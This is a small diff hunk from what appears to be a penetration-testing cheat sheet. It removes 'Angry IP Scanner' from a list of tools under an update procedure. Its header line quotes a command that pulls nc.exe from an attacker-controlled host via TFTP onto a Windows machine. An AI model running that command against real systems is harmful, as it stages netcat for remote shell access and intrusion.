@@ -225,7 +225,6 @@ tftp -i <attacker IP> get nc.exe                 # Run from Windows
 # Update procedure
 
 update
-Angry IP Scanner
 Burp Suite Pro
 DbVisualizer
 Iceweasel plugins
